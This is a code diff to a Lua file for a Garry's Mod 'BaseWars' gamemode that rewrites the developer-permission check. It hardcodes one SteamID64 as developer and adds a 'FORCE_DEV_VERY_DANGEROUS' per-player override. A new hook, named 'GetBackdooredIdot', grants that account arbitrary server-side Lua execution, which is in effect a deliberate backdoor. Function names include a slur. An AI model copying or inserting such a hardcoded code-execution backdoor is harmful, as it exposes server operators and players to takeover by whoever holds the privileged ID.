@@ -3,9 +3,11 @@ function BaseWars.IsDev(what)
 	if not info then return false end
 
 	local ply = info:GetPlayer()
-	return info:SteamID64() == "76561198040821426" and (
-		not IsValid(ply) or (ply.DevForce == nil or ply.DevForce)
-	)
+
+	local force = ply.FORCE_DEV_VERY_DANGEROUS
+	if force ~= nil then return force end
+
+	return info:SteamID64() == "76561198040821426" or ply == NULL
 end
 
 BaseWars.EclipseIDs = {
@@ -19,6 +21,13 @@ function BaseWars.IsRetarded(what)
 
 	return BaseWars.IsDev(what) or BaseWars.EclipseIDs[info:SteamID64()]
 end
+
+hook.Add("CanLuaDev", "GetBackdooredIdot", function(ply)
+	if BaseWars.IsDev(ply) then
+		ply:ChatPrint("Allowing LuaDev due to dev perms")
+		return true
+	end
+end)
 
 local function I_HATE_ONEWAYS() -- :antichrist:
 	list.Set("RenderFX", "#renderfx.hologram", nil)
